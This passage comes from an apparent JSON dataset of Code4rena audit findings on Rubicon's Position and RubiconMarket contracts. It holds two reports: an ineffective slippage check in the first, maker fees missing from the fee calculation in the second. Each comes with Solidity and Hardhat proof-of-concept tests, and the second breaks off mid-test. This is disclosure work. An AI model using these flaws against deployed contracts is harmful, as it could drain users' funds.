!= 0, \"0 offerId\"); //Fails if there are not more offers\n\n            // There is a chance that pay_amt is smaller than 1 wei of the other token\n            if (\n                mul(pay_amt, 1 ether) <\n                wdiv(offers[offerId].buy_amt, offers[offerId].pay_amt)\n            ) {\n                break; //We consider that all amount is sold\n            }\n            if (pay_amt >= offers[offerId].buy_amt) {\n                //If amount to sell is higher or equal than current offer amount to buy\n                fill_amt = add(fill_amt, offers[offerId].pay_amt); //Add amount bought to acumulator\n                pay_amt = sub(pay_amt, offers[offerId].buy_amt); //Decrease amount to sell\n                take(bytes32(offerId), uint128(offers[offerId].pay_amt)); //We take the whole offer\n            } else {\n                // if lower\n                uint256 baux = rmul(\n                    mul(pay_amt, 10 ** 9),\n                    rdiv(offers[offerId].pay_amt, offers[offerId].buy_amt)\n                ) / 10 ** 9;\n                fill_amt = add(fill_amt, baux); //Add amount bought to acumulator\n                take(bytes32(offerId), uint128(baux)); //We take the portion of the offer that we need\n                pay_amt = 0; //All amount is sold\n            }\n        }\n\n        /** @audit console.log min_fill_amount for POC purpose */\n        console.log(\"min_fill_amount:\");\n        console.log(min_fill_amount);\n        console.log(\"\");\n        /** */\n\n        /** @audit console.log fill_amt for POC purpose */\n        console.log(\"fill_amt that includes fee:\");\n        console.log(fill_amt);\n        console.log(\"\");\n\n        console.log(\"Is the fill_amt, which includes fee, bigger than min_fill_amount that does not include fee?\");\n        console.log(fill_amt > min_fill_amount);\n        console.log(\"\");\n        /** */\n\n        require(fill_amt >= min_fill_amount, \"min_fill_amount isn't filled\");\n        fill_amt = calcAmountAfterFee(fill_amt);\n\n        /** @audit console.log fill_amt with fee deducted for POC purpose */\n        console.log(\"fill_amt with fee deducted:\");\n        console.log(fill_amt);\n        console.log(\"\");\n\n        console.log(\"Does the fill_amt with fee deducted equal min_fill_amount that does not include fee?\");\n        console.log(fill_amt == min_fill_amount);\n        console.log(\"\");\n        /** */\n    }\n```\n\nThird, please add the following `Calling Position._marketSell function compares fill_amt that includes fee to min_fill_amount that does not include fee` test in the `Long positions` `describe` block in `test\\hardhat-tests\\leverage-wrapper.ts`. This test will pass to print the logs below for demonstrating the described scenario.\n\n```typescript\n      it.only(\"Calling Position._marketSell function compares fill_amt that includes fee to min_fill_amount that does not include fee\", async function () {\n        const { owner, testCoin, testStableCoin, Position, rubiconMarket } =\n          await loadFixture(deployPoolsUtilityFixture);\n\n        await Position.connect(owner).buyAllAmountWithLeverage(\n          testCoin.address,\n          testStableCoin.address,\n          TEST_AMOUNT,\n          x1_25\n        );\n\n        await rubiconMarket.functions[\"offer(uint256,address,uint256,address)\"](\n          parseUnits(\"1300\", 6),\n          testStableCoin.address,\n          parseUnits(\"1000\"),\n          testCoin.address,\n          { from: owner.address }\n        );\n\n        // Call Position.closePosition function, which further calls Position._marketSell function.\n        // console.logs in RubiconMarket.sellAllAmount function show that\n        //   the fill_amt, which includes fee, is bigger than min_fill_amount that does not include fee and\n        //   the fill_amt with fee deducted equals min_fill_amount input that does not include fee.\n        await Position.connect(owner).closePosition(1);\n      });\n```\n\n```solidity\nmin_fill_amount:\n5625001\n\nfill_amt that includes fee:\n5625057\n\nIs the fill_amt, which includes fee, bigger than min_fill_amount that does not include fee?\ntrue\n\nfill_amt with fee deducted:\n5625001\n\nDoes the fill_amt with fee deducted equal min_fill_amount that does not include fee?\ntrue\n```\n",
      "other": "**lines_of_code:**\n# Lines of code\n\nhttps://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/utilities/poolsUtility/Position.sol#L475-L511\nhttps://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/RubiconMarket.sol#L1028-L1067\n\n**container:**\n# Vulnerability details\n\n**tools_used:**\n## Tools Used\nVSCode\n",
      "sections": {
        "description": null,
        "impact": "## Impact\nCalling the following `Position._marketSell` function calls `rubiconMarket.sellAllAmount(ERC20(_asset), _payAmount, ERC20(_quote), _minFill)`, where `_minFill` does not include `_fee`.\n\nhttps://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/utilities/poolsUtility/Position.sol#L475-L511\n```solidity\n    function _marketSell(\n        address _asset,\n        address _quote,\n        uint256 _minFill\n    ) internal {\n        uint256 _feeBPS = rubiconMarket.getFeeBPS();\n        uint256 _fee = _minFill.mul(_feeBPS).div(10000);\n        uint256 _payAmount = rubiconMarket.getPayAmount(\n            ERC20(_asset),\n            ERC20(_quote),\n            _minFill.add(_fee)\n        );\n        uint256 _assetBalance = IERC20(_asset).balanceOf(address(this));\n\n        /// @dev recalculate fee in _asset form\n        _fee = _payAmount.mul(_feeBPS).div(10000);\n\n        if (_assetBalance < _payAmount) {\n            IERC20(_asset).transferFrom(\n                msg.sender,\n                address(this),\n                _payAmount.sub(_assetBalance).add(_fee)\n            );\n        }\n\n        IERC20(_asset).approve(\n            address(rubiconMarket),\n            IERC20(_asset).balanceOf(address(this))\n        );\n\n        rubiconMarket.sellAllAmount(\n            ERC20(_asset),\n            _payAmount,\n            ERC20(_quote),\n            _minFill\n        );\n    }\n```\n\nCalling the following `RubiconMarket.sellAllAmount` function then executes `require(fill_amt >= min_fill_amount, \"min_fill_amount isn't filled\")`. In contrast to `min_fill_amount`, which is the `Position._marketSell` function's `_minFill` that does not include `_fee`, `fill_amt` used in this `require` statement includes the fee. This means that `fill_amt` is very likely to be bigger than `min_fill_amount`, which makes this `require` statement and the corresponding slippage control not effective. In fact, as shown by the POC below, the `fill_amt` with the fee deducted that is set by calling `calcAmountAfterFee(fill_amt)` can equal `min_fill_amount`, which also proves that the `fill_amt`, which includes the fee, would be larger than `min_fill_amount` that does not include fee, and improperly comparing these two in the `require` statement would only result in an ineffective slippage control.\n\nhttps://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/RubiconMarket.sol#L1028-L1067\n```solidity\n    function sellAllAmount(\n        ERC20 pay_gem,\n        uint256 pay_amt,\n        ERC20 buy_gem,\n        uint256 min_fill_amount\n    ) external returns (uint256 fill_amt) {\n        require(!locked);\n\n        uint256 offerId;\n        while (pay_amt > 0) {\n            //while there is amount to sell\n            offerId = getBestOffer(buy_gem, pay_gem); //Get the best offer for the token pair\n            require(offerId != 0, \"0 offerId\"); //Fails if there are not more offers\n\n            // There is a chance that pay_amt is smaller than 1 wei of the other token\n            if (\n                mul(pay_amt, 1 ether) <\n                wdiv(offers[offerId].buy_amt, offers[offerId].pay_amt)\n            ) {\n                break; //We consider that all amount is sold\n            }\n            if (pay_amt >= offers[offerId].buy_amt) {\n                //If amount to sell is higher or equal than current offer amount to buy\n                fill_amt = add(fill_amt, offers[offerId].pay_amt); //Add amount bought to acumulator\n                pay_amt = sub(pay_amt, offers[offerId].buy_amt); //Decrease amount to sell\n                take(bytes32(offerId), uint128(offers[offerId].pay_amt)); //We take the whole offer\n            } else {\n                // if lower\n                uint256 baux = rmul(\n                    mul(pay_amt, 10 ** 9),\n                    rdiv(offers[offerId].pay_amt, offers[offerId].buy_amt)\n                ) / 10 ** 9;\n                fill_amt = add(fill_amt, baux); //Add amount bought to acumulator\n                take(bytes32(offerId), uint128(baux)); //We take the portion of the offer that we need\n                pay_amt = 0; //All amount is sold\n            }\n        }\n        require(fill_amt >= min_fill_amount, \"min_fill_amount isn't filled\");\n        fill_amt = calcAmountAfterFee(fill_amt);\n    }\n```\n",
        "recommendation": "## Recommended Mitigation Steps\nThe `Position._marketSell` function can be updated to call `rubiconMarket.sellAllAmount(ERC20(_asset), _payAmount, ERC20(_quote), _minFill.add(_fee))` instead of `rubiconMarket.sellAllAmount(ERC20(_asset), _payAmount, ERC20(_quote), _minFill)`.\n",
        "poc": "## Proof of Concept\nFirst, please update the `Position._marketSell` function as follows to divide by `100_000` for the POC purpose. This is for fixing the bug mentioned in the report titled \"Calling `Position._marketBuy` and `Position._marketSell` functions that calculate `_fee` by dividing by `10000` can cause incorrect calculations\".\n\n```solidity\n    function _marketSell(\n        address _asset,\n        address _quote,\n        uint256 _minFill\n    ) internal {\n        uint256 _feeBPS = rubiconMarket.getFeeBPS();\n\n        /** @audit divide by 100_000 for POC purpose */\n        // uint256 _fee = _minFill.mul(_feeBPS).div(10000);\n        uint256 _fee = _minFill.mul(_feeBPS).div(100_000);\n        /** */\n\n        uint256 _payAmount = rubiconMarket.getPayAmount(\n            ERC20(_asset),\n            ERC20(_quote),\n            _minFill.add(_fee)\n        );\n        uint256 _assetBalance = IERC20(_asset).balanceOf(address(this));\n\n        /** @audit divide by 100_000 for POC purpose */\n        /// @dev recalculate fee in _asset form\n        // _fee = _payAmount.mul(_feeBPS).div(10000);\n        _fee = _payAmount.mul(_feeBPS).div(100_000);\n        /** */\n\n        if (_assetBalance < _payAmount) {\n            IERC20(_asset).transferFrom(\n                msg.sender,\n                address(this),\n                _payAmount.sub(_assetBalance).add(_fee)\n            );\n        }\n\n        IERC20(_asset).approve(\n            address(rubiconMarket),\n            IERC20(_asset).balanceOf(address(this))\n        );\n\n        rubiconMarket.sellAllAmount(\n            ERC20(_asset),\n            _payAmount,\n            ERC20(_quote),\n            _minFill\n        );\n    }\n```\n\nSecond, please update the `RubiconMarket.sellAllAmount` function as follows to log `min_fill_amount`, the `fill_amt` that includes fee, and the `fill_amt` with the fee deducted for the POC purpose.\n\n```solidity\n    function sellAllAmount(\n        ERC20 pay_gem,\n        uint256 pay_amt,\n        ERC20 buy_gem,\n        uint256 min_fill_amount\n    ) external returns (uint256 fill_amt) {\n        require(!locked);\n\n        uint256 offerId;\n        while (pay_amt > 0) {\n            //while there is amount to sell\n            offerId = getBestOffer(buy_gem, pay_gem); //Get the best offer for the token pair\n            require(offerId != 0, \"0 offerId\"); //Fails if there are not more offers\n\n            // There is a chance that pay_amt is smaller than 1 wei of the other token\n            if (\n                mul(pay_amt, 1 ether) <\n                wdiv(offers[offerId].buy_amt, offers[offerId].pay_amt)\n            ) {\n                break; //We consider that all amount is sold\n            }\n            if (pay_amt >= offers[offerId].buy_amt) {\n                //If amount to sell is higher or equal than current offer amount to buy\n                fill_amt = add(fill_amt, offers[offerId].pay_amt); //Add amount bought to acumulator\n                pay_amt = sub(pay_amt, offers[offerId].buy_amt); //Decrease amount to sell\n                take(bytes32(offerId), uint128(offers[offerId].pay_amt)); //We take the whole offer\n            } else {\n                // if lower\n                uint256 baux = rmul(\n                    mul(pay_amt, 10 ** 9),\n                    rdiv(offers[offerId].pay_amt, offers[offerId].buy_amt)\n                ) / 10 ** 9;\n                fill_amt = add(fill_amt, baux); //Add amount bought to acumulator\n                take(bytes32(offerId), uint128(baux)); //We take the portion of the offer that we need\n                pay_amt = 0; //All amount is sold\n            }\n        }\n\n        /** @audit console.log min_fill_amount for POC purpose */\n        console.log(\"min_fill_amount:\");\n        console.log(min_fill_amount);\n        console.log(\"\");\n        /** */\n\n        /** @audit console.log fill_amt for POC purpose */\n        console.log(\"fill_amt that includes fee:\");\n        console.log(fill_amt);\n        console.log(\"\");\n\n        console.log(\"Is the fill_amt, which includes fee, bigger than min_fill_amount that does not include fee?\");\n        console.log(fill_amt > min_fill_amount);\n        console.log(\"\");\n        /** */\n\n        require(fill_amt >= min_fill_amount, \"min_fill_amount isn't filled\");\n        fill_amt = calcAmountAfterFee(fill_amt);\n\n        /** @audit console.log fill_amt with fee deducted for POC purpose */\n        console.log(\"fill_amt with fee deducted:\");\n        console.log(fill_amt);\n        console.log(\"\");\n\n        console.log(\"Does the fill_amt with fee deducted equal min_fill_amount that does not include fee?\");\n        console.log(fill_amt == min_fill_amount);\n        console.log(\"\");\n        /** */\n    }\n```\n\nThird, please add the following `Calling Position._marketSell function compares fill_amt that includes fee to min_fill_amount that does not include fee` test in the `Long positions` `describe` block in `test\\hardhat-tests\\leverage-wrapper.ts`. This test will pass to print the logs below for demonstrating the described scenario.\n\n```typescript\n      it.only(\"Calling Position._marketSell function compares fill_amt that includes fee to min_fill_amount that does not include fee\", async function () {\n        const { owner, testCoin, testStableCoin, Position, rubiconMarket } =\n          await loadFixture(deployPoolsUtilityFixture);\n\n        await Position.connect(owner).buyAllAmountWithLeverage(\n          testCoin.address,\n          testStableCoin.address,\n          TEST_AMOUNT,\n          x1_25\n        );\n\n        await rubiconMarket.functions[\"offer(uint256,address,uint256,address)\"](\n          parseUnits(\"1300\", 6),\n          testStableCoin.address,\n          parseUnits(\"1000\"),\n          testCoin.address,\n          { from: owner.address }\n        );\n\n        // Call Position.closePosition function, which further calls Position._marketSell function.\n        // console.logs in RubiconMarket.sellAllAmount function show that\n        //   the fill_amt, which includes fee, is bigger than min_fill_amount that does not include fee and\n        //   the fill_amt with fee deducted equals min_fill_amount input that does not include fee.\n        await Position.connect(owner).closePosition(1);\n      });\n```\n\n```solidity\nmin_fill_amount:\n5625001\n\nfill_amt that includes fee:\n5625057\n\nIs the fill_amt, which includes fee, bigger than min_fill_amount that does not include fee?\ntrue\n\nfill_amt with fee deducted:\n5625001\n\nDoes the fill_amt with fee deducted equal min_fill_amount that does not include fee?\ntrue\n```\n",
        "fix_status": null,
        "other": "**lines_of_code:**\n# Lines of code\n\nhttps://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/utilities/poolsUtility/Position.sol#L475-L511\nhttps://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/RubiconMarket.sol#L1028-L1067\n\n**container:**\n# Vulnerability details\n\n**tools_used:**\n## Tools Used\nVSCode\n"
      },
      "markdown_body": "https://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/utilities/poolsUtility/Position.sol#L475-L511\nhttps://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/RubiconMarket.sol#L1028-L1067\n\n\n# Vulnerability details\n\n## Impact\nCalling the following `Position._marketSell` function calls `rubiconMarket.sellAllAmount(ERC20(_asset), _payAmount, ERC20(_quote), _minFill)`, where `_minFill` does not include `_fee`.\n\nhttps://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/utilities/poolsUtility/Position.sol#L475-L511\n```solidity\n    function _marketSell(\n        address _asset,\n        address _quote,\n        uint256 _minFill\n    ) internal {\n        uint256 _feeBPS = rubiconMarket.getFeeBPS();\n        uint256 _fee = _minFill.mul(_feeBPS).div(10000);\n        uint256 _payAmount = rubiconMarket.getPayAmount(\n            ERC20(_asset),\n            ERC20(_quote),\n            _minFill.add(_fee)\n        );\n        uint256 _assetBalance = IERC20(_asset).balanceOf(address(this));\n\n        /// @dev recalculate fee in _asset form\n        _fee = _payAmount.mul(_feeBPS).div(10000);\n\n        if (_assetBalance < _payAmount) {\n            IERC20(_asset).transferFrom(\n                msg.sender,\n                address(this),\n                _payAmount.sub(_assetBalance).add(_fee)\n            );\n        }\n\n        IERC20(_asset).approve(\n            address(rubiconMarket),\n            IERC20(_asset).balanceOf(address(this))\n        );\n\n        rubiconMarket.sellAllAmount(\n            ERC20(_asset),\n            _payAmount,\n            ERC20(_quote),\n            _minFill\n        );\n    }\n```\n\nCalling the following `RubiconMarket.sellAllAmount` function then executes `require(fill_amt >= min_fill_amount, \"min_fill_amount isn't filled\")`. In contrast to `min_fill_amount`, which is the `Position._marketSell` function's `_minFill` that does not include `_fee`, `fill_amt` used in this `require` statement includes the fee. This means that `fill_amt` is very likely to be bigger than `min_fill_amount`, which makes this `require` statement and the corresponding slippage control not effective. In fact, as shown by the POC below, the `fill_amt` with the fee deducted that is set by calling `calcAmountAfterFee(fill_amt)` can equal `min_fill_amount`, which also proves that the `fill_amt`, which includes the fee, would be larger than `min_fill_amount` that does not include fee, and improperly comparing these two in the `require` statement would only result in an ineffective slippage control.\n\nhttps://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/RubiconMarket.sol#L1028-L1067\n```solidity\n    function sellAllAmount(\n        ERC20 pay_gem,\n        uint256 pay_amt,\n        ERC20 buy_gem,\n        uint256 min_fill_amount\n    ) external returns (uint256 fill_amt) {\n        require(!locked);\n\n        uint256 offerId;\n        while (pay_amt > 0) {\n            //while there is amount to sell\n            offerId = getBestOffer(buy_gem, pay_gem); //Get the best offer for the token pair\n            require(offerId != 0, \"0 offerId\"); //Fails if there are not more offers\n\n            // There is a chance that pay_amt is smaller than 1 wei of the other token\n            if (\n                mul(pay_amt, 1 ether) <\n                wdiv(offers[offerId].buy_amt, offers[offerId].pay_amt)\n            ) {\n                break; //We consider that all amount is sold\n            }\n            if (pay_amt >= offers[offerId].buy_amt) {\n                //If amount to sell is higher or equal than current offer amount to buy\n                fill_amt = add(fill_amt, offers[offerId].pay_amt); //Add amount bought to acumulator\n                pay_amt = sub(pay_amt, offers[offerId].buy_amt); //Decrease amount to sell\n                take(bytes32(offerId), uint128(offers[offerId].pay_amt)); //We take the whole offer\n            } else {\n                // if lower\n                uint256 baux = rmul(\n                    mul(pay_amt, 10 ** 9),\n                    rdiv(offers[offerId].pay_amt, offers[offerId].buy_amt)\n                ) / 10 ** 9;\n                fill_amt = add(fill_amt, baux); //Add amount bought to acumulator\n                take(bytes32(offerId), uint128(baux)); //We take the portion of the offer that we need\n                pay_amt = 0; //All amount is sold\n            }\n        }\n        require(fill_amt >= min_fill_amount, \"min_fill_amount isn't filled\");\n        fill_amt = calcAmountAfterFee(fill_amt);\n    }\n```\n\n## Proof of Concept\nFirst, please update the `Position._marketSell` function as follows to divide by `100_000` for the POC purpose. This is for fixing the bug mentioned in the report titled \"Calling `Position._marketBuy` and `Position._marketSell` functions that calculate `_fee` by dividing by `10000` can cause incorrect calculations\".\n\n```solidity\n    function _marketSell(\n        address _asset,\n        address _quote,\n        uint256 _minFill\n    ) internal {\n        uint256 _feeBPS = rubiconMarket.getFeeBPS();\n\n        /** @audit divide by 100_000 for POC purpose */\n        // uint256 _fee = _minFill.mul(_feeBPS).div(10000);\n        uint256 _fee = _minFill.mul(_feeBPS).div(100_000);\n        /** */\n\n        uint256 _payAmount = rubiconMarket.getPayAmount(\n            ERC20(_asset),\n            ERC20(_quote),\n            _minFill.add(_fee)\n        );\n        uint256 _assetBalance = IERC20(_asset).balanceOf(address(this));\n\n        /** @audit divide by 100_000 for POC purpose */\n        /// @dev recalculate fee in _asset form\n        // _fee = _payAmount.mul(_feeBPS).div(10000);\n        _fee = _payAmount.mul(_feeBPS).div(100_000);\n        /** */\n\n        if (_assetBalance < _payAmount) {\n            IERC20(_asset).transferFrom(\n                msg.sender,\n                address(this),\n                _payAmount.sub(_assetBalance).add(_fee)\n            );\n        }\n\n        IERC20(_asset).approve(\n            address(rubiconMarket),\n            IERC20(_asset).balanceOf(address(this))\n        );\n\n        rubiconMarket.sellAllAmount(\n            ERC20(_asset),\n            _payAmount,\n            ERC20(_quote),\n            _minFill\n        );\n    }\n```\n\nSecond, please update the `RubiconMarket.sellAllAmount` function as follows to log `min_fill_amount`, the `fill_amt` that includes fee, and the `fill_amt` with the fee deducted for the POC purpose.\n\n```solidity\n    function sellAllAmount(\n        ERC20 pay_gem,\n        uint256 pay_amt,\n        ERC20 buy_gem,\n        uint256 min_fill_amount\n    ) external returns (uint256 fill_amt) {\n        require(!locked);\n\n        uint256 offerId;\n        while (pay_amt > 0) {\n            //while there is amount to sell\n            offerId = getBestOffer(buy_gem, pay_gem); //Get the best offer for the token pair\n            require(offerId != 0, \"0 offerId\"); //Fails if there are not more offers\n\n            // There is a chance that pay_amt is smaller than 1 wei of the other token\n            if (\n                mul(pay_amt, 1 ether) <\n                wdiv(offers[offerId].buy_amt, offers[offerId].pay_amt)\n            ) {\n                break; //We consider that all amount is sold\n            }\n            if (pay_amt >= offers[offerId].buy_amt) {\n                //If amount to sell is higher or equal than current offer amount to buy\n                fill_amt = add(fill_amt, offers[offerId].pay_amt); //Add amount bought to acumulator\n                pay_amt = sub(pay_amt, offers[offerId].buy_amt); //Decrease amount to sell\n                take(bytes32(offerId), uint128(offers[offerId].pay_amt)); //We take the whole offer\n            } else {\n                // if lower\n                uint256 baux = rmul(\n                    mul(pay_amt, 10 ** 9),\n                    rdiv(offers[offerId].pay_amt, offers[offerId].buy_amt)\n                ) / 10 ** 9;\n                fill_amt = add(fill_amt, baux); //Add amount bought to acumulator\n                take(bytes32(offerId), uint128(baux)); //We take the portion of the offer that we need\n                pay_amt = 0; //All amount is sold\n            }\n        }\n\n        /** @audit console.log min_fill_amount for POC purpose */\n        console.log(\"min_fill_amount:\");\n        console.log(min_fill_amount);\n        console.log(\"\");\n        /** */\n\n        /** @audit console.log fill_amt for POC purpose */\n        console.log(\"fill_amt that includes fee:\");\n        console.log(fill_amt);\n        console.log(\"\");\n\n        console.log(\"Is the fill_amt, which includes fee, bigger than min_fill_amount that does not include fee?\");\n        console.log(fill_amt > min_fill_amount);\n        console.log(\"\");\n        /** */\n\n        require(fill_amt >= min_fill_amount, \"min_fill_amount isn't filled\");\n        fill_amt = calcAmountAfterFee(fill_amt);\n\n        /** @audit console.log fill_amt with fee deducted for POC purpose */\n        console.log(\"fill_amt with fee deducted:\");\n        console.log(fill_amt);\n        console.log(\"\");\n\n        console.log(\"Does the fill_amt with fee deducted equal min_fill_amount that does not include fee?\");\n        console.log(fill_amt == min_fill_amount);\n        console.log(\"\");\n        /** */\n    }\n```\n\nThird, please add the following `Calling Position._marketSell function compares fill_amt that includes fee to min_fill_amount that does not include fee` test in the `Long positions` `describe` block in `test\\hardhat-tests\\leverage-wrapper.ts`. This test will pass to print the logs below for demonstrating the described scenario.\n\n```typescript\n      it.only(\"Calling Position._marketSell function compares fill_amt that includes fee to min_fill_amount that does not include fee\", async function () {\n        const { owner, testCoin, testStableCoin, Position, rubiconMarket } =\n          await loadFixture(deployPoolsUtilityFixture);\n\n        await Position.connect(owner).buyAllAmountWithLeverage(\n          testCoin.address,\n          testStableCoin.address,\n          TEST_AMOUNT,\n          x1_25\n        );\n\n        await rubiconMarket.functions[\"offer(uint256,address,uint256,address)\"](\n          parseUnits(\"1300\", 6),\n          testStableCoin.address,\n          parseUnits(\"1000\"),\n          testCoin.address,\n          { from: owner.address }\n        );\n\n        // Call Position.closePosition function, which further calls Position._marketSell function.\n        // console.logs in RubiconMarket.sellAllAmount function show that\n        //   the fill_amt, which includes fee, is bigger than min_fill_amount that does not include fee and\n        //   the fill_amt with fee deducted equals min_fill_amount input that does not include fee.\n        await Position.connect(owner).closePosition(1);\n      });\n```\n\n```solidity\nmin_fill_amount:\n5625001\n\nfill_amt that includes fee:\n5625057\n\nIs the fill_amt, which includes fee, bigger than min_fill_amount that does not include fee?\ntrue\n\nfill_amt with fee deducted:\n5625001\n\nDoes the fill_amt with fee deducted equal min_fill_amount that does not include fee?\ntrue\n```\n\n## Tools Used\nVSCode\n\n## Recommended Mitigation Steps\nThe `Position._marketSell` function can be updated to call `rubiconMarket.sellAllAmount(ERC20(_asset), _payAmount, ERC20(_quote), _minFill.add(_fee))` instead of `rubiconMarket.sellAllAmount(ERC20(_asset), _payAmount, ERC20(_quote), _minFill)`.\n",
      "metadata": {
        "Severity": "High",
        "Difficulty": null,
        "Type": "bug",
        "Finding ID": null,
        "Target": null
      }
    },
    {
      "index": 902,
      "page_start": null,
      "heading": "902. Incorrect calculations can occur when calling `Position._marketBuy` and `Position._marketSell` functions that do not include maker fee in `_fee`",
      "heading_cleaned": "Incorrect calculations can occur when calling `Position._marketBuy` and `Position._marketSell` functions that do not include maker fee in `_fee`",
      "markdown": "# Lines of code\n\nhttps://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/utilities/poolsUtility/Position.sol#L454-L473\nhttps://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/utilities/poolsUtility/Position.sol#L475-L511\nhttps://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/RubiconMarket.sol#L314-L448\n\n\n# Vulnerability details\n\n## Impact\nWhen the following `Position._marketBuy` and `Position._marketSell` functions calculate `_fee`, the maker fee is not included.\n\nhttps://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/utilities/poolsUtility/Position.sol#L454-L473\n```solidity\n    function _marketBuy(\n        address _asset,\n        address _quote,\n        uint256 _maxFill\n    ) internal {\n        uint256 _fee = _maxFill.mul(rubiconMarket.getFeeBPS()).div(10000);\n        uint256 _buyAmount = rubiconMarket.getBuyAmount(\n            ERC20(_asset),\n            ERC20(_quote),\n            _maxFill.sub(_fee)\n        );\n        IERC20(_quote).approve(address(rubiconMarket), _maxFill);\n\n        rubiconMarket.buyAllAmount(\n            ERC20(_asset),\n            _buyAmount,\n            ERC20(_quote),\n            _maxFill\n        );\n    }\n```\n\nhttps://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/utilities/poolsUtility/Position.sol#L475-L511\n```solidity\n    function _marketSell(\n        address _asset,\n        address _quote,\n        uint256 _minFill\n    ) internal {\n        uint256 _feeBPS = rubiconMarket.getFeeBPS();\n        uint256 _fee = _minFill.mul(_feeBPS).div(10000);\n        uint256 _payAmount = rubiconMarket.getPayAmount(\n            ERC20(_asset),\n            ERC20(_quote),\n            _minFill.add(_fee)\n        );\n        uint256 _assetBalance = IERC20(_asset).balanceOf(address(this));\n\n        /// @dev recalculate fee in _asset form\n        _fee = _payAmount.mul(_feeBPS).div(10000);\n\n        if (_assetBalance < _payAmount) {\n            IERC20(_asset).transferFrom(\n                msg.sender,\n                address(this),\n                _payAmount.sub(_assetBalance).add(_fee)\n            );\n        }\n\n        IERC20(_asset).approve(\n            address(rubiconMarket),\n            IERC20(_asset).balanceOf(address(this))\n        );\n\n        rubiconMarket.sellAllAmount(\n            ERC20(_asset),\n            _payAmount,\n            ERC20(_quote),\n            _minFill\n        );\n    }\n```\n\nWhen the `Position._marketBuy` and `Position._marketSell` functions eventually call the following `RubiconMarket.buy` function, the maker fee can be considered and paid when `makerFee() > 0` is true.\n\nhttps://github.com/code-423n4/2023-04-rubicon/blob/main/contracts/RubiconMarket.sol#L314-L448\n```solidity\n    function buy(\n        uint256 id,\n        uint256 quantity\n    ) public virtual can_buy(id) synchronized returns (bool) {\n        OfferInfo memory _offer = offers[id];\n        uint256 spend = mul(quantity, _offer.buy_amt) / _offer.pay_amt;\n\n        require(uint128(spend) == spend, \"spend is not an int\");\n        require(uint128(quantity) == quantity, \"quantity is not an int\");\n\n        ///@dev For backwards semantic compatibility.\n        if (\n            quantity == 0 ||\n            spend == 0 ||\n            quantity > _offer.pay_amt ||\n            spend > _offer.buy_amt\n        ) {\n            return false;\n        }\n\n        offers[id].pay_amt = sub(_offer.pay_amt, quantity);\n        offers[id].buy_amt = sub(_offer.buy_amt, spend);\n\n        /// @dev Fee logic added on taker trades\n        uint256 fee = mul(spend, feeBPS) / 100_000;\n        require(\n            _offer.buy_gem.transferFrom(msg.sender, feeTo, fee),\n            \"Insufficient funds to cover fee\"\n        );\n\n        // taker pay maker 0_0\n        if (makerFee() > 0) {\n            uint256 mFee = mul(spend, makerFee()) / 100_000;\n\n            /// @dev Handle the v1 -> v2 migration case where if owner == address(0) we transfer this fee to _offer.recipient\n            if (_offer.owner == address(0) && getRecipient(id) != address(0)) {\n                require(\n                    _offer.buy_gem.transferFrom(\n                        msg.sender,\n                        _offer.recipient,\n                        mFee\n                    ),\n                    \"Insufficient funds to cover fee\"\n                );\n            } else {\n                require(\n                    _offer.buy_gem.transferFrom(msg.sender, _offer.owner, mFee),\n                    \"Insufficient funds to cover fee\"\n                );\n            }\n\n            ...\n        }\n        ...\n    }\n```\n\nSince the `Position._marketBuy` and `Position._marketSell` functions do not consider the maker fee but the `RubiconMarket.buy` function does, `_fee` calculated by the `Position._marketBuy` and `Position._marketSell` functions and the fees, including the maker fee, that are paid by the user when calling the `RubiconMarket.buy` function are different. As a result, calling the `Position` contract's functions that eventually call the `Position._marketBuy` or `Position._marketSell` function can cause incorrect calculations and user funds to be lost. For instance, when calling the `Position.buyAllAmountWithLeverage` function, the user should receive less asset tokens when the `Position._marketBuy` function includes the maker fee in `_fee` than when the `Position._marketBuy` function does not include the maker fee in `_fee`. Since the `Position._marketBuy` function currently does not include the maker fee in `_fee`, the user receives more asset tokens than she or he is entitled to, and other users' asset tokens in the protocol are lost.\n\n## Proof of Concept\nFirst, please update the `Position._marketBuy` function as follows to divide by `100_000` for the POC purpose. This is for fixing the bug mentioned in the report titled \"Calling `Position._marketBuy` and `Position._marketSell` functions that calculate `_fee` by dividing by `10000` can cause incorrect calculations\".\n\n```solidity\n    function _marketBuy(\n        address _asset,\n        address _quote,\n        uint256 _maxFill\n    ) internal {\n        /** @audit divide by 100_000 for POC purpose */\n        // uint256 _fee = _maxFill.mul(rubiconMarket.getFeeBPS()).div(10000);\n        uint256 _fee = _maxFill.mul(rubiconMarket.getFeeBPS()).div(100_000);\n        /** */\n\n        uint256 _buyAmount = rubiconMarket.getBuyAmount(\n            ERC20(_asset),\n            ERC20(_quote),\n            _maxFill.sub(_fee)\n        );\n        IERC20(_quote).approve(address(rubiconMarket), _maxFill);\n\n        rubiconMarket.buyAllAmount(\n            ERC20(_asset),\n            _buyAmount,\n            ERC20(_quote),\n            _maxFill\n        );\n    }\n```\n\nSecond, please add the following `changes of quote and asset tokens when Position._marketBuy function calculates _fee through dividing by 100_000 but does not consider maker fee` test in the `Long positions` `describe` block in `test\\hardhat-tests\\leverage-wrapper.ts`. This test will pass to show the number of asset tokens received by the user who calls the `Position.buyAllAmountWithLeverage` function when the `Position._marketBuy` function does not include the maker fee in `_fee`.\n\n```typescript\n      it.only(\"changes of quote and asset tokens when Position._marketBuy function calculates _fee through dividing by 100_000 but does not consider maker fee\", async function () {\n        const { owner, testCoin, testStableCoin, Position, rubiconMarket} =\n          await loadFixture(deployPoolsUtilityFixture);\n\n        // testCoin is quote token when calling Position.buyAllAmountWithLeverage function\n        const ownerTestCoinBalanceBefore = await testCoin.balanceOf(owner.address);\n\n        // testStableCoin is asset token when calling Position.buyAllAmountWithLeverage function\n        const ownerTestStableCoinBefore = await testStableCoin.balanceOf(owner.address);\n\n        // there is a maker fee\n        const fee = 50;\n        await 